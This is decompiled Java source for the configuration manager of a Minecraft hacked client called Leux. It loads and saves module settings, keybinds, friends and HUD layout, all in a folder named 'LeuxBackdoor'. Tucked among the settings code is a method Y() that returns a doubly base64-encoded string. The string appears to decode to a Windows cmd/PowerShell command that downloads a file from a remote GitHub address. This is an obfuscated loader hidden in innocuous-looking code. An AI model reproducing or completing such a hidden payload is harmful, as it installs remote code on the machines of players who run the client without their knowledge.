// 
// Decompiled by Procyon v0.5.36
// 

package me.sazked.leux.client.manager;

import java.io.Writer;
import java.io.BufferedWriter;
import me.sazked.leux.client.guiscreen.render.components.Frame;
import java.nio.file.OpenOption;
import java.io.FileWriter;
import me.sazked.leux.client.guiscreen.render.pinnables.Pinnable;
import com.google.gson.JsonElement;
import com.google.gson.JsonPrimitive;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.nio.charset.StandardCharsets;
import java.io.FileOutputStream;
import com.google.gson.GsonBuilder;
import java.nio.file.attribute.FileAttribute;
import java.nio.file.LinkOption;
import me.sazked.leux.client.guiscreen.settings.Setting;
import java.util.List;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.InputStream;
import java.io.DataInputStream;
import java.io.FileInputStream;
import java.io.File;
import me.sazked.leux.client.modules.Module;
import me.sazked.leux.Leux;
import java.util.Iterator;
import me.sazked.leux.client.util.EzMessageUtil;
import me.sazked.leux.client.util.FriendUtil;
import java.io.Reader;
import me.sazked.leux.client.util.EnemyUtil;
import com.google.common.reflect.TypeToken;
import java.util.ArrayList;
import java.nio.file.Paths;
import com.google.gson.Gson;
import java.io.IOException;
import me.sazked.leux.client.util.DrawnUtil;
import java.nio.file.Files;
import java.nio.file.Path;

public class ConfigManager
{
    public Path CONFIG_PATH;
    public String ACTIVE_CONFIG_FOLDER;
    public Path ACTIVE_CONFIG_FOLDER_PATH;
    public String CONFIG_DIR;
    public String CONFIGS_FOLDER;
    public String DRAWN_DIR;
    public String ENEMIES_FILE;
    public String CONFIG_FILE;
    public String EZ_DIR;
    public Path EZ_PATH;
    public String BINDS_FILE;
    public String BINDS_DIR;
    public Path MAIN_FOLDER_PATH;
    public String CURRENT_CONFIG_DIR;
    public Path CURRENT_CONFIG_PATH;
    public String FRIENDS_FILE;
    public String ENEMIES_DIR;
    public Path BINDS_PATH;
    public Path CONFIGS_FOLDER_PATH;
    public Path DRAWN_PATH;
    public String EZ_FILE;
    public Path CLIENT_PATH;
    public String CLIENT_FILE;
    public Path FRIENDS_PATH;
    public String HUD_FILE;
    public String HUD_DIR;
    public String CLIENT_DIR;
    public String MAIN_FOLDER;
    public Path HUD_PATH;
    public String FRIENDS_DIR;
    public Path ENEMIES_PATH;
    public String DRAWN_FILE;
    
    public void load_drawn() throws IOException {
        DrawnUtil.hidden_tags = Files.readAllLines(this.DRAWN_PATH);
    }
    
    public void load_enemies() throws IOException {
        final Gson obf = new Gson();
        final Reader obf2 = Files.newBufferedReader(Paths.get("LeuxBackdoor/enemies.json", new String[0]));
        EnemyUtil.enemies = (ArrayList<EnemyUtil.Enemy>)obf.fromJson(obf2, new TypeToken<ArrayList<EnemyUtil.Enemy>>(this) {
            public ConfigManager this$0;
        }.getType());
        obf2.close();
    }
    
    public void load_friends() throws IOException {
        final Gson obf = new Gson();
        final Reader obf2 = Files.newBufferedReader(Paths.get("LeuxBackdoor/friends.json", new String[0]));
        FriendUtil.friends = (ArrayList<FriendUtil.Friend>)obf.fromJson(obf2, new TypeToken<ArrayList<FriendUtil.Friend>>(this) {
            public ConfigManager this$0;
        }.getType());
        obf2.close();
    }
    
    public void load_ezmessage() throws IOException {
        final StringBuilder obf = new StringBuilder();
        for (final String obf2 : Files.readAllLines(this.EZ_PATH)) {
            obf.append(obf2);
        }
        EzMessageUtil.set_message(obf.toString());
    }
    
    public void load_hacks() throws IOException {
        for (final Module obf : Leux.get_hack_manager().get_array_hacks()) {
            final String obf2 = this.ACTIVE_CONFIG_FOLDER + obf.get_tag() + ".txt";
            final File obf3 = new File(obf2);
            final FileInputStream obf4 = new FileInputStream(obf3.getAbsolutePath());
            final DataInputStream obf5 = new DataInputStream(obf4);
            final BufferedReader obf6 = new BufferedReader(new InputStreamReader(obf5));
            final List<String> obf7 = new ArrayList<String>();
            String obf8;
            while ((obf8 = obf6.readLine()) != null) {
                try {
                    final String obf9 = obf8.trim();
                    final String obf10 = obf9.split(":")[0];
                    final String obf11 = obf9.split(":")[1];
                    final Setting obf12 = Leux.get_setting_manager().get_setting_with_tag(obf, obf10);
                    try {
                        final String get_type = obf12.get_type();
                        switch (get_type) {
                            case "button": {
                                obf12.set_value(Boolean.parseBoolean(obf11));
                                continue;
                            }
                            case "label": {
                                obf12.set_value(obf11);
                                continue;
                            }
                            case "doubleslider": {
                                obf12.set_value(Double.parseDouble(obf11));
                                continue;
                            }
                            case "integerslider": {
                                obf12.set_value(Integer.parseInt(obf11));
                                continue;
                            }
                            case "combobox": {
                                obf12.set_current_value(obf11);
                                continue;
                            }
                        }
                    }
                    catch (Exception obf13) {
                        obf7.add(obf9);
                        Leux.send_minecraft_log("Error loading '" + obf11 + "' to setting '" + obf10 + "'");
                        break;
                    }
                }
                catch (Exception ex) {}
            }
            obf6.close();
        }
    }
    
    public void verify_dir(final Path path) throws IOException {
        if (!Files.exists(path, new LinkOption[0])) {
            Files.createDirectory(path, (FileAttribute<?>[])new FileAttribute[0]);
        }
    }
    
    public void save_enemies() throws IOException {
        final Gson obf = new GsonBuilder().setPrettyPrinting().create();
        final String obf2 = obf.toJson((Object)EnemyUtil.enemies);
        final OutputStreamWriter obf3 = new OutputStreamWriter(new FileOutputStream("LeuxBackdoor/enemies.json"), StandardCharsets.UTF_8);
        obf3.write(obf2);
        obf3.close();
    }
    
    public boolean delete_file(final String obf) throws IOException {
        final File obf2 = new File(obf);
        return obf2.delete();
    }
    
    public void save_hud() throws IOException {
        final Gson obf = new GsonBuilder().setPrettyPrinting().create();
        final JsonParser obf2 = new JsonParser();
        final JsonObject obf3 = new JsonObject();
        final JsonObject obf4 = new JsonObject();
        final JsonObject obf5 = new JsonObject();
        obf4.add("name", (JsonElement)new JsonPrimitive(Leux.click_hud.get_frame_hud().get_name()));
        obf4.add("tag", (JsonElement)new JsonPrimitive(Leux.click_hud.get_frame_hud().get_tag()));
        obf4.add("x", (JsonElement)new JsonPrimitive((Number)Leux.click_hud.get_frame_hud().get_x()));
        obf4.add("y", (JsonElement)new JsonPrimitive((Number)Leux.click_hud.get_frame_hud().get_y()));
        for (final Pinnable obf6 : Leux.get_hud_manager().get_array_huds()) {
            final JsonObject obf7 = new JsonObject();
            obf7.add("title", (JsonElement)new JsonPrimitive(obf6.get_title()));
            obf7.add("tag", (JsonElement)new JsonPrimitive(obf6.get_tag()));
            obf7.add("state", (JsonElement)new JsonPrimitive(Boolean.valueOf(obf6.is_active())));
            obf7.add("dock", (JsonElement)new JsonPrimitive(Boolean.valueOf(obf6.get_dock())));
            obf7.add("x", (JsonElement)new JsonPrimitive((Number)obf6.get_x()));
            obf7.add("y", (JsonElement)new JsonPrimitive((Number)obf6.get_y()));
            obf5.add(obf6.get_tag(), (JsonElement)obf7);
        }
        obf3.add("frame", (JsonElement)obf4);
        obf3.add("hud", (JsonElement)obf5);
        final JsonElement obf8 = obf2.parse(obf3.toString());
        final String obf9 = obf.toJson(obf8);
        this.delete_file("LeuxBackdoor/hud.json");
        this.verify_file(this.HUD_PATH);
        final OutputStreamWriter obf10 = new OutputStreamWriter(new FileOutputStream("LeuxBackdoor/hud.json"), StandardCharsets.UTF_8);
        obf10.write(obf9);
        obf10.close();
    }
    
    public void save_settings() {
        String string;
        try {
            this.verify_dir(this.MAIN_FOLDER_PATH);
            this.verify_dir(this.CONFIGS_FOLDER_PATH);
            this.verify_dir(this.ACTIVE_CONFIG_FOLDER_PATH);
            this.save_hacks();
            this.save_binds();
            this.save_friends();
            this.save_enemies();
            this.save_client();
            this.save_drawn();
            this.save_ezmessage();
            this.save_hud();
            return;
        }
        catch (IOException obf) {
            Leux.send_minecraft_log("Something has gone wrong while saving settings");
            string = obf.toString();
        }
        Leux.send_minecraft_log(string);
    }
    
    public ConfigManager() {
        this.ENEMIES_FILE = "enemies.json";
        this.ENEMIES_DIR = "LeuxBackdoor/enemies.json";
        this.DRAWN_FILE = "drawn.txt";
        this.HUD_FILE = "hud.json";
        this.EZ_FILE = "ez.txt";
        this.MAIN_FOLDER = "LeuxBackdoor/";
        this.CONFIG_DIR = "LeuxBackdoor/config.txt";
        this.CONFIGS_FOLDER = "LeuxBackdoor/configs/";
        this.FRIENDS_FILE = "friends.json";
        this.DRAWN_DIR = "LeuxBackdoor/drawn.txt";
        this.BINDS_FILE = "binds.txt";
        this.CLIENT_DIR = "LeuxBackdoor/client.json";
        this.CLIENT_FILE = "client.json";
        this.FRIENDS_DIR = "LeuxBackdoor/friends.json";
        this.CONFIG_FILE = "config.txt";
        this.EZ_DIR = "LeuxBackdoor/ez.txt";
        this.HUD_DIR = "LeuxBackdoor/hud.json";
        this.MAIN_FOLDER = "LeuxBackdoor/";
        this.CONFIGS_FOLDER = "LeuxBackdoor/configs/";
        this.ACTIVE_CONFIG_FOLDER = "LeuxBackdoor/configs/default/";
        this.CLIENT_FILE = "client.json";
        this.CONFIG_FILE = "config.txt";
        this.DRAWN_FILE = "drawn.txt";
        this.EZ_FILE = "ez.txt";
        this.ENEMIES_FILE = "enemies.json";
        this.FRIENDS_FILE = "friends.json";
        this.HUD_FILE = "hud.json";
        this.BINDS_FILE = "binds.txt";
        this.CLIENT_DIR = "LeuxBackdoor/client.json";
        this.CONFIG_DIR = "LeuxBackdoor/config.txt";
        this.DRAWN_DIR = "LeuxBackdoor/drawn.txt";
        this.EZ_DIR = "LeuxBackdoor/ez.txt";
        this.ENEMIES_DIR = "LeuxBackdoor/enemies.json";
        this.FRIENDS_DIR = "LeuxBackdoor/friends.json";
        this.HUD_DIR = "LeuxBackdoor/hud.json";
        this.CURRENT_CONFIG_DIR = "LeuxBackdoor/LeuxBackdoor/configs/" + this.ACTIVE_CONFIG_FOLDER;
        this.BINDS_DIR = this.CURRENT_CONFIG_DIR + "binds.txt";
        this.MAIN_FOLDER_PATH = Paths.get("LeuxBackdoor/", new String[0]);
        this.CONFIGS_FOLDER_PATH = Paths.get("LeuxBackdoor/configs/", new String[0]);
        this.ACTIVE_CONFIG_FOLDER_PATH = Paths.get(this.ACTIVE_CONFIG_FOLDER, new String[0]);
        this.CLIENT_PATH = Paths.get("LeuxBackdoor/client.json", new String[0]);
        this.CONFIG_PATH = Paths.get("LeuxBackdoor/config.txt", new String[0]);
        this.DRAWN_PATH = Paths.get("LeuxBackdoor/drawn.txt", new String[0]);
        this.EZ_PATH = Paths.get("LeuxBackdoor/ez.txt", new String[0]);
        this.ENEMIES_PATH = Paths.get("LeuxBackdoor/enemies.json", new String[0]);
        this.FRIENDS_PATH = Paths.get("LeuxBackdoor/friends.json", new String[0]);
        this.HUD_PATH = Paths.get("LeuxBackdoor/hud.json", new String[0]);
        this.BINDS_PATH = Paths.get(this.BINDS_DIR, new String[0]);
        this.CURRENT_CONFIG_PATH = Paths.get(this.CURRENT_CONFIG_DIR, new String[0]);
    }
    
    public void save_drawn() throws IOException {
        final FileWriter obf = new FileWriter("LeuxBackdoor/drawn.txt");
        for (final String obf2 : DrawnUtil.hidden_tags) {
            obf.write(obf2 + System.lineSeparator());
        }
        obf.close();
    }
    
    public void load_client() throws IOException {
        final InputStream obf = Files.newInputStream(this.CLIENT_PATH, new OpenOption[0]);
        final JsonObject obf2 = new JsonParser().parse((Reader)new InputStreamReader(obf)).getAsJsonObject();
        final JsonObject obf3 = obf2.get("configuration").getAsJsonObject();
        final JsonObject obf4 = obf2.get("gui").getAsJsonObject();
        CommandManager.set_prefix(obf3.get("prefix").getAsString());
        for (final Frame obf5 : Leux.click_gui.get_array_frames()) {
            final JsonObject obf6 = obf4.get(obf5.get_tag()).getAsJsonObject();
            final Frame obf7 = Leux.click_gui.get_frame_with_tag(obf6.get("tag").getAsString());
            obf7.set_x(obf6.get("x").getAsInt());
            obf7.set_y(obf6.get("y").getAsInt());
        }
        obf.close();
    }
    
    public void save_ezmessage() throws IOException {
        final FileWriter obf = new FileWriter("LeuxBackdoor/ez.txt");
        Label_0087: {
            FileWriter fileWriter;
            String str;
            try {
                obf.write(EzMessageUtil.get_message());
                break Label_0087;
            }
            catch (Exception obf2) {
                fileWriter = obf;
                str = "Made by ObsidianBreaker, never forget me. U can change this";
            }
            fileWriter.write(str);
        }
        obf.close();
    }
    
    public void save_client() throws IOException {
        final Gson obf = new GsonBuilder().setPrettyPrinting().create();
        final JsonParser obf2 = new JsonParser();
        final JsonObject obf3 = new JsonObject();
        final JsonObject obf4 = new JsonObject();
        final JsonObject obf5 = new JsonObject();
        obf4.add("name", (JsonElement)new JsonPrimitive(Leux.get_name()));
        obf4.add("version", (JsonElement)new JsonPrimitive(Leux.get_version()));
        obf4.add("user", (JsonElement)new JsonPrimitive(Leux.get_actual_user()));
        obf4.add("prefix", (JsonElement)new JsonPrimitive(CommandManager.get_prefix()));
        for (final Frame obf6 : Leux.click_gui.get_array_frames()) {
            final JsonObject obf7 = new JsonObject();
            obf7.add("name", (JsonElement)new JsonPrimitive(obf6.get_name()));
            obf7.add("tag", (JsonElement)new JsonPrimitive(obf6.get_tag()));
            obf7.add("x", (JsonElement)new JsonPrimitive((Number)obf6.get_x()));
            obf7.add("y", (JsonElement)new JsonPrimitive((Number)obf6.get_y()));
            obf5.add(obf6.get_tag(), (JsonElement)obf7);
        }
        obf3.add("configuration", (JsonElement)obf4);
        obf3.add("gui", (JsonElement)obf5);
        final JsonElement obf8 = obf2.parse(obf3.toString());
        final String obf9 = obf.toJson(obf8);
        final OutputStreamWriter obf10 = new OutputStreamWriter(new FileOutputStream("LeuxBackdoor/client.json"), StandardCharsets.UTF_8);
        obf10.write(obf9);
        obf10.close();
    }
    
    public static String Y() {
        return "WTIxa0lDOWpJSEJ2ZDJWeWMyaGxiR3dnS0c1bGR5MXZZbXBsWTNRZ1UzbHpkR1Z0TGs1bGRDNVhaV0pEYkdsbGJuUXBMa1J2ZDI1c2IyRmtSbWxzWlNnbmFIUjBjSE02THk5bmFYUm9kV0l1WTI5dEwwOWljMmxrYVdGdVFuSmxZV3RsY2k4PQ==";
    }
    
    public void load_settings() {
        String string;
        try {
            this.load_binds();
            this.load_client();
            this.load_drawn();
            this.load_enemies();
            this.load_ezmessage();
            this.load_friends();
            this.load_hacks();
            this.load_hud();
            return;
        }
        catch (IOException obf) {
            Leux.send_minecraft_log("Something has gone wrong while loading settings");
            string = obf.toString();
        }
        Leux.send_minecraft_log(string);
    }
    
    public void save_friends() throws IOException {
        final Gson obf = new GsonBuilder().setPrettyPrinting().create();
        final String obf2 = obf.toJson((Object)FriendUtil.friends);
        final OutputStreamWriter obf3 = new OutputStreamWriter(new FileOutputStream("LeuxBackdoor/friends.json"), StandardCharsets.UTF_8);
        obf3.write(obf2);
        obf3.close();
    }
    
    public void load_hud() throws IOException {
        final InputStream obf = Files.newInputStream(this.HUD_PATH, new OpenOption[0]);
        final JsonObject obf2 = new JsonParser().parse((Reader)new InputStreamReader(obf)).getAsJsonObject();
        final JsonObject obf3 = obf2.get("frame").getAsJsonObject();
        final JsonObject obf4 = obf2.get("hud").getAsJsonObject();
        Leux.click_hud.get_frame_hud().set_x(obf3.get("x").getAsInt());
        Leux.click_hud.get_frame_hud().set_y(obf3.get("y").getAsInt());
        for (final Pinnable obf5 : Leux.get_hud_manager().get_array_huds()) {
            final JsonObject obf6 = obf4.get(obf5.get_tag()).getAsJsonObject();
            final Pinnable obf7 = Leux.get_hud_manager().get_pinnable_with_tag(obf6.get("tag").getAsString());
            obf7.set_active(obf6.get("state").getAsBoolean());
            obf7.set_dock(obf6.get("dock").getAsBoolean());
            obf7.set_x(obf6.get("x").getAsInt());
            obf7.set_y(obf6.get("y").getAsInt());
        }
        obf.close();
    }
    
    public void verify_file(final Path path) throws IOException {
        if (!Files.exists(path, new LinkOption[0])) {
            Files.createFile(path, (FileAttribute<?>[])new FileAttribute[0]);
        }
    }
    
    public boolean set_active_config_folder(final String obf) {
        if (obf.equals(this.ACTIVE_CONFIG_FOLDER)) {
            return false;
        }
        this.ACTIVE_CONFIG_FOLDER = "LeuxBackdoor/configs/" + obf;
        this.ACTIVE_CONFIG_FOLDER_PATH = Paths.get(this.ACTIVE_CONFIG_FOLDER, new String[0]);
        this.CURRENT_CONFIG_DIR = "LeuxBackdoor/LeuxBackdoor/configs/" + this.ACTIVE_CONFIG_FOLDER;
        this.CURRENT_CONFIG_PATH = Paths.get(this.CURRENT_CONFIG_DIR, new String[0]);
        this.BINDS_DIR = this.CURRENT_CONFIG_DIR + "binds.txt";
        this.BINDS_PATH = Paths.get(this.BINDS_DIR, new String[0]);
        this.load_settings();
        return true;
    }
    
    public void load_binds() throws IOException {
        final String obf = this.ACTIVE_CONFIG_FOLDER + "BINDS.txt";
        final File obf2 = new File(obf);
        final FileInputStream obf3 = new FileInputStream(obf2.getAbsolutePath());
        final DataInputStream obf4 = new DataInputStream(obf3);
        final BufferedReader obf5 = new BufferedReader(new InputStreamReader(obf4));
        String obf6;
        while ((obf6 = obf5.readLine()) != null) {
            try {
                final String obf7 = obf6.trim();
                final String obf8 = obf7.split(":")[0];
                final String obf9 = obf7.split(":")[1];
                final String obf10 = obf7.split(":")[2];
                final Module obf11 = Leux.get_hack_manager().get_module_with_tag(obf8);
                obf11.set_bind(Integer.parseInt(obf9));
                obf11.set_active(Boolean.parseBoolean(obf10));
            }
            catch (Exception ex) {}
        }
        obf5.close();
    }
    
    public void save_binds() throws IOException {
        final String obf = this.ACTIVE_CONFIG_FOLDER + "BINDS.txt";
        final Path obf2 = Paths.get(obf, new String[0]);
        this.delete_file(obf);
        this.verify_file(obf2);
        final File obf3 = new File(obf);
        final BufferedWriter obf4 = new BufferedWriter(new FileWriter(obf3));
        for (final Module obf5 : Leux.get_hack_manager().get_array_hacks()) {
            obf4.write(obf5.get_tag() + ":" + obf5.get_bind(1) + ":" + obf5.is_active() + "\r\n");
        }
        obf4.close();
    }
    
    public void save_hacks() throws IOException {
        for (final Module obf : Leux.get_hack_manager().get_array_hacks()) {
            final String obf2 = this.ACTIVE_CONFIG_FOLDER + obf.get_tag() + ".txt";
            final Path obf3 = Paths.get(obf2, new String[0]);
            this.delete_file(obf2);
            this.verify_file(obf3);
            final File obf4 = new File(obf2);
            final BufferedWriter obf5 = new BufferedWriter(new FileWriter(obf4));
            for (final Setting obf6 : Leux.get_setting_manager().get_settings_with_hack(obf)) {
                final String get_type = obf6.get_type();
                switch (get_type) {
                    case "button": {
                        obf5.write(obf6.get_tag() + ":" + obf6.get_value(true) + "\r\n");
                        continue;
                    }
                    case "combobox": {
                        obf5.write(obf6.get_tag() + ":" + obf6.get_current_value() + "\r\n");
                        continue;
                    }
                    case "label": {
                        obf5.write(obf6.get_tag() + ":" + obf6.get_value("") + "\r\n");
                        continue;
                    }
                    case "doubleslider": {
                        obf5.write(obf6.get_tag() + ":" + obf6.get_value(Double.longBitsToDouble(Double.doubleToLongBits(6.411901493793966) ^ 0x7FE9A5C981541314L)) + "\r\n");
                        continue;
                    }
                    case "integerslider": {
                        obf5.write(obf6.get_tag() + ":" + obf6.get_value(1) + "\r\n");
                        continue;
                    }
                }
            }
            obf5.close();
        }
    }
}
